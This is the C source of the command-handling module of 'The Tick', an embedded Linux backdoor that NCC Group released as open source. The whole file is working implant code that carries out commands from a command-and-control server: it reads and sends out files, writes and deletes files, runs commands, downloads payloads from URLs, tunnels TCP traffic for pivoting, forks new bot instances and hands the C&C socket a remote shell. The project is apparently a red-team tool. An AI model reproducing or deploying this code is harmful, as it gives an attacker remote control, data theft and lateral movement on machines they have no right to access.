/*
 * The Tick, a Linux embedded backdoor.
 * 
 * Released as open source by NCC Group Plc - http://www.nccgroup.com/
 * Developed by Mario Vilas, mario.vilas@nccgroup.com
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
*/

#include <sys/types.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/in.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/statvfs.h>
#include <libgen.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netdb.h>

#include "shell.h"
#include "tcp.h"
#include "file.h"
#include "http.h"
#include "parser.h"

#include "command.h"

// Main command loop.
int command_loop(Parser *p)
{
    while (1) {

        // Wait for the next command and read the command block header.
        // This call will block and reconnect if needed.
        parser_wait(p);

        // Now depending on the command ID we will do a number of things.
        switch (p->header.cmd_id)
        {

        // Just a simple no operation command. Useful for testing.
        case CMD_NOP:
            parser_ok(p);
            break;

        // Kill command. Just kill the current process.
        // Global cleanup will be handled by the atexit routine.
        case CMD_SYSTEM_EXIT:
            printf("User requested termination.\n");
            parser_ok(p);
            parser_close(p);
            return 1;

        // Fork the bot. This will create a new bot instance with a new UUID.
        case CMD_SYSTEM_FORK:
            do_system_fork(p);
            break;

        // Run an interactive shell.
        // This command reuses the C&C connection.
        case CMD_SYSTEM_SHELL:
            do_system_shell(p);
            printf("Channel reused, reconnecting...\n");
            return 0;

        // Grab a file from the target machine.
        case CMD_FILE_READ:
            do_file_read(p);
            break;

        // Put a file into the target machine.
        case CMD_FILE_WRITE:
            do_file_write(p);
            break;

        // Delete a file in the target machine.
        case CMD_FILE_DELETE:
            do_file_delete(p);
            break;

        // Chmod a file in the target machine.
        case CMD_FILE_CHMOD:
            do_file_chmod(p);
            break;

        // Run a non-interactive command and return the response.
        case CMD_FILE_EXEC:
            do_file_exec(p);
            break;

        // Download a file into the target machine.
        case CMD_HTTP_DOWNLOAD:
            do_http_download(p);
            break;

        // Domain name resolution.
        case CMD_DNS_RESOLVE:
            do_dns_resolve(p);
            break;

        // Simple TCP pivot.
        // This command reuses the C&C connection.
        case CMD_TCP_PIVOT:
            do_tcp_pivot(p);
            printf("Channel reused, reconnecting...\n");
            return 0;

        // Unsupported command.
        default:
            printf("Unsupported command: 0x%4x 0x%04x 0x%08x\n", p->header.cmd_id, p->header.cmd_len, p->header.data_len);
            parser_error(p, "not supported");
            break;
        }

        // Skip any unread bytes from the socket until we reach the next command.
        parser_next(p);
    }
}

void do_file_read(Parser *p)
{
    int file = -1;
    char *filename = (char *) &p->buffer;
    struct stat info;

    // Get the filename (first argument).
    if (parser_get_first_arg(p) < 0) {
        parser_error(p, "file name too long");
        return;
    }

    // Make sure we have read access to the file.
    if (access(filename, F_OK) == -1) {
        printf("Cannot find %s\n", filename);
        parser_error(p, "file not found");
        return;
    }
    if (access(filename, R_OK) == -1) {
        printf("Cannot read %s\n", filename);
        parser_error(p, "file not readable");
        return;
    }

    // Open the file.
    file = open(filename, O_RDONLY);
    if (file < 0) {
        printf("Cannot open %s\n", filename);
        parser_error(p, "cannot open file");
        return;
    }

    // Make sure the file isn't empty.
    info.st_size = 0;
    stat(filename, &info);
    if (info.st_size == 0) {
        printf("Cannot stat or empty file %s\n", filename);
        parser_error(p, "cannot stat or empty file");
        return;
    }

    // Make sure the file isn't too big to send.
    if (info.st_size > UINT32_MAX) {
        printf("File too large %s\n", filename);
        parser_error(p, "file too large");
        return;
    }

    // Send the file in the response.
    // Close the connection if something goes wrong at this point.
    printf("Reading file %s\n", filename);
    parser_begin_response(p, CMD_STATUS_OK, info.st_size);
    if (copy_stream(file, p->fd, info.st_size) < 0) {
        parser_close(p);
        printf("Error sending file (%ld bytes)\n", info.st_size);
    } else {
        printf("Success (%ld bytes)\n", info.st_size);
    }
    close(file);
}

void do_file_write(Parser *p)
{
    int file = -1;
    int success = -1;
    size_t available = 0;
    char *filename = (char *) &p->buffer;
    char *pathname = NULL;
    struct statvfs info;

    // Get the filename (first argument).
    if (parser_get_first_arg(p) < 0) {
        parser_error(p, "file name too long");
        return;
    }

    // Make sure there's enough space in the target mount point.
    pathname = dirname(filename);
    if (statvfs(pathname, &info) < 0) {
        parser_error(p, "cannot stat target directory");
        return;
    }
    if (pathname == filename) {
        filename[strlen(filename)] = '/';
    }
    available = info.f_bfree * info.f_bsize;
    if (available < (size_t) p->header.data_len) {
        parser_error(p, "not enough free space");
        return;
    }

    // Open the file for writing.
    file = open(filename, O_WRONLY | O_CREAT | O_TRUNC | O_SYNC, 0777);
    if (file < 0) {
        printf("Cannot open %s\n", filename);
        parser_error(p, "cannot open file");
        return;
    }

    // Fix the mode (in case umask is messing with us).
    chmod(filename, 0777);

    // Save the file data as it comes from the socket.
    printf("Writing file %s\n", filename);
    success = copy_stream(p->fd, file, p->header.data_len);
    close(file);
    if (success < 0) {
        printf("Error receiving file (%d bytes)\n", p->header.data_len);
        parser_error(p, "failed to write file");
        parser_close(p);
    } else {
        printf("Success (%d bytes)\n", p->header.data_len);
        parser_ok(p);
    }
    p->header.data_len = 0;     // Make sure to reset this counter!
}

void do_file_delete(Parser *p)
{
    char *filename = (char *) &p->buffer;

    // Get the filename (first argument).
    if (parser_get_first_arg(p) < 0) {
        parser_error(p, "file name too long");
        return;
    }

    // Delete the file.
    if (unlink(filename) < 0) {
        printf("Error deleting file %s\n", filename);
        parser_error(p, "could not delete");
    } else {
        printf("Deleted file %s\n", filename);
        parser_ok(p);
    }
}

void do_file_chmod(Parser *p)
{
    char *filename = (char *) &p->buffer;
    uint16_t mode = 0;

    // First two bytes of the first argument are the mode flags in network byte order.
    if (p->header.cmd_len < sizeof(mode) + 2) {
        printf("Malformed chmod command block\n");
        parser_error(p, "malformed command block");
        parser_close(p);
    }
    if (recv_block(p->fd, (char *) &mode, sizeof(mode)) < 0) {
        printf("Malformed chmod command block\n");
        parser_error(p, "malformed command block");
        parser_close(p);
    }
    p->header.cmd_len = p->header.cmd_len - sizeof(mode);
    mode = ntohs(mode);

    // The following bytes of the first argument are the filename.
    if (parser_get_first_arg(p) < 0) {
        parser_error(p, "file name too long");
        return;
    }

    // Chmod the file.
    if (chmod(filename, mode) < 0) {
        printf("Error changing file mode to %03o %s\n", mode, filename);
        parser_error(p, "could not chmod");
    } else {
        printf("Changed file mode to %03o %s\n", mode, filename);
        parser_ok(p);
    }
}

void do_file_exec(Parser *p)
{
    char *command = (char *) &p->buffer;
    uint16_t buffer_length = 0;
    char buffer[1024];

    // Get the filename (first argument).
    if (parser_get_first_arg(p) < 0) {
        parser_error(p, "command line too long");
        return;
    }

    // Execute the command.
    printf("Executing: %s\n", command);
    if (run_simple_command(command, (char *) buffer, sizeof(buffer))) {
        printf("Success\n");
        buffer_length = strlen(buffer);
        parser_begin_response(p, CMD_STATUS_OK, buffer_length);
        send_block(p->fd, buffer, buffer_length);
    } else {
        printf("Error\n");
        parser_error(p, "could not execute");
    }
}

void do_http_download(Parser *p)
{
    char *url = (char *) p->buffer;
    char filename[1024];

    // The first argument is the URL.
    if (parser_get_first_arg(p) < 0) {
        parser_error(p, "url too long");
        return;
    }

    // The second argument is the filename.
    if (parser_read_second_arg(p, (char *) &filename, sizeof(filename)) < 0){
        parser_error(p, "file name too long");
        return;
    }

    // Download the file.
    printf("Downloading url %s\n", url);
    if (download_file(url, filename, 0) < 0) {
        printf("Error downloading file %s\n", filename);
        parser_error(p, "could not download");
    } else {
        printf("Downloaded file %s\n", filename);
        parser_ok(p);
    }
}

void do_dns_resolve(Parser *p)
{
    int entries = 0;
    uint32_t resp_size = 0;
    struct addrinfo* result = NULL;
    struct addrinfo* res = NULL;

    // The first argument is the domain name to resolve.
    if (parser_get_first_arg(p) < 0) {
        parser_error(p, "domain name too long");
        return;
    }

    // Resolve the domain name.
    printf("Resolving domain %s\n", (const char *) &p->buffer);
    if (getaddrinfo((const char *) &p->buffer, NULL, NULL, &result) != 0) {
        printf("Failed to resolve domain\n");
        parser_error(p, "could not resolve domain name");
        return;
    }

    // Calculate the size of the response structure.
    // The response will be an array of structures in this format:
    //      BYTE                family (AF_INET or AF_INET6)
    //      UCHAR[4 or 16]      address (IPv4 or IPv6)
    entries = 0;
    resp_size = 0;
    for (res = result; res != NULL; res = res->ai_next) {
        if (res->ai_family == AF_INET && res->ai_protocol == IPPROTO_TCP) {
            resp_size += 5;
            entries++;
        } else if (res->ai_family == AF_INET6 && res->ai_protocol == IPPROTO_TCP) {
            resp_size += 17;
            entries++;
        }
    }
    printf("Found %d address(es)\n", entries);

    // Send the response.
    parser_begin_response(p, CMD_STATUS_OK, resp_size);
    for (res = result; res != NULL; res = res->ai_next) {
        if (res->ai_family == AF_INET && res->ai_protocol == IPPROTO_TCP) {
            send_block(p->fd, (const char *) &res->ai_family, 1);
            send_block(p->fd, (const char *) &((struct sockaddr_in *) res->ai_addr)->sin_addr, 4);
        } else if (res->ai_family == AF_INET6 && res->ai_protocol == IPPROTO_TCP) {
            send_block(p->fd, (const char *) &res->ai_family, 1);
            send_block(p->fd, (const char *) &((struct sockaddr_in6 *) res->ai_addr)->sin6_addr, 16);
        }
    }
}

void do_tcp_pivot(Parser *p)
{
    int sock = -1;
    CMD_TCP_PIVOT_ARGS *pivot = (CMD_TCP_PIVOT_ARGS *) p->buffer;
    struct sockaddr_in sa;

    // Read the TCP pivot options structure.
    if (p->header.cmd_len != sizeof(CMD_TCP_PIVOT_ARGS) || parser_read_first_arg(p, (char *) &p->buffer, sizeof(CMD_TCP_PIVOT_ARGS)) < 0) {
        printf("Malformed TCP pivot request\n");
        parser_error(p, "malformed request");
        parser_close(p);
        return;
    }

    // Connect to the target IP and port.
    sock = create_socket(AF_INET);
    memset((void *) &sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    if (pivot->from_port != 0) {
        sa.sin_port = pivot->from_port;
        bind(sock, (const struct sockaddr *) &sa, sizeof(sa));
    }
    sa.sin_port = pivot->port;
    memcpy((void *) &sa.sin_addr, (void *) &pivot->ip, sizeof(sa.sin_addr));
    if (pivot->from_port != 0) {
        printf("Pivoting to %s:%d from port %d\n", inet_ntoa(sa.sin_addr), ntohs(pivot->port), ntohs(pivot->from_port));
    } else {
        printf("Pivoting to %s:%d\n", inet_ntoa(sa.sin_addr), ntohs(pivot->port));
    }
    if (connect_socket(sock, (const struct sockaddr *) &sa, sizeof(sa)) < 0) {
        if (pivot->from_port != 0) {
            printf("Can not connect to %s:%d from port %d\n", inet_ntoa(sa.sin_addr), ntohs(pivot->port), ntohs(pivot->from_port));
        } else {
            printf("Can not connect to %s:%d\n", inet_ntoa(sa.sin_addr), ntohs(pivot->port));
        }
        parser_error(p, "connection refused");
        return;
    }

    // Send the OK status before launching the tunnel, since we'll be reusing the channel.
    parser_ok(p);

    // Fork the process twice.
    if (fork() == 0) {
        if (fork() == 0) {

            // The first process will handle the source to destination data.
            copy_stream(p->fd, sock, -1);

        } else {

            // The second process will handle the destination to source data.
            copy_stream(sock, p->fd, -1);

        }

        // Both processes will kill their sockets and quit.
        disconnect_tcp(p->fd);
        disconnect_tcp(sock);
        exit(0);

    } else {

        // Log the event.
        if (pivot->from_port != 0) {
            printf("Launched TCP tunnel to %s:%d from port %d\n", inet_ntoa(sa.sin_addr), pivot->port, pivot->from_port);
        } else {
            printf("Launched TCP tunnel to %s:%d\n", inet_ntoa(sa.sin_addr), pivot->port);
        }

        // Close the socket object and reconnect.
        // Do not shutdown! The parent process still uses this connection.
        close(p->fd);
        p->fd = -1;
        parser_close(p);

    }
}

void do_system_fork(Parser *p)
{
    unsigned char uuid[16];

    // Generate a new UUID for the new instance.
    uuid4(uuid);

    // Send the new UUID back to the caller.
    parser_begin_response(p, CMD_STATUS_OK, sizeof(uuid));
    send_block(p->fd, uuid, sizeof(uuid));

    // Fork the new instance.
    if (fork() == 0) {

        // We are in the child instance now.
        // Set the new UUID into the Parser object.
        memcpy(p->uuid, uuid, sizeof(uuid));

        // Close the socket object and reconnect.
        // Do not shutdown! The parent process still uses this connection.
        close(p->fd);
        p->fd = -1;
        parser_close(p);
        parser_connect(p);
    }
}

void do_system_shell(Parser *p)
{
    char *shell = NULL;
    char *argv[2];

    // Find out what our shell is.
    shell = getenv("SHELL");

    // If for some odd reason we don't have a SHELL variable, hardcode a default.
    if (shell == NULL) {
        shell = "/bin/sh";
    }

    // Test if the file actually exists and we have execution permission.
    if (access(shell, X_OK) == -1) {
        printf("Cannot find a shell for the current user\n");
        parser_error(p, "no shell available");
        return;
    }

    // Send the OK status before invoking the shell, since we'll be reusing the channel.
    parser_ok(p);

    // Fork the process.
    if (fork() == 0) {

        // The new process will invoke the shell and pipe it though the socket.
        // The socket timeout values will be disabled.
        setsockopt(p->fd, SOL_SOCKET, SO_RCVTIMEO, NULL, 0);
        setsockopt(p->fd, SOL_SOCKET, SO_SNDTIMEO, NULL, 0);
        dup2(p->fd, 0);
        dup2(p->fd, 1);
        dup2(p->fd, 2);
        argv[0] = shell;
        argv[1] = NULL;
        execvp(shell, argv);

    } else {

        // The parent process will "forget" the connection.
        close(p->fd);
        p->fd = -1;
        parser_close(p);

    }
    printf("Launched remote shell\n");
}
